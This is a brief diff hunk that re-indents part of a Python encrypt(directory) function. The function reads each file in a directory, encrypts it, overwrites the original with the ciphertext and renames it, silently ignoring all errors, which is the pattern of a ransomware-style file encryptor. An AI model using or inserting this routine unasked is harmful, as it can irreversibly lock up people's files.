@@ -21,11 +21,11 @@ def encrypt(directory):
                 with open(directory + file, 'rb') as f:
                     file = f.read()
                     
-                    token = key.encrypt(file)
+                token = key.encrypt(file)
 
-                    with open(directory+filename,'wb') as f:
-                        f.write(token)
-                    os.rename(directory+str_fn, directory+new_name)
+                with open(directory+filename,'wb') as f:
+                    f.write(token)
+                os.rename(directory+str_fn, directory+new_name)
             except:
                 pass
 
